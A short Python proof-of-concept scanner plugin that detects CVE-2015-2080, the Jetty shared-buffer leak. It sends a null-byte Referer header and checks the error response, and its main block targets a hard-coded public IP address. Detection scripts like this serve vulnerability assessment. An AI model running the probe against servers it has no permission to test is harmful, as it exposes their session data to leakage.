#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  [CVE-2015-2080] Jetty web server 远程共享缓冲区泄漏
References:  http://drops.wooyun.org/papers/4972
Author    :  foxhack
QQ        :  278563291
Desc      :  [CVE-2015-2080] Jetty web server 远程共享缓冲区泄漏会话信息
"""
import urlparse
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    url = arg
    code, head, _, _, _ = curl.curl('-e "\x00" -d "" '+url)
    #print res
    if code == 400 and ("Illegal character 0x0 in state" in head):
    	security_hole("This version of Jetty is VULNERABLE")


if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://173.255.112.128:8080/')[1])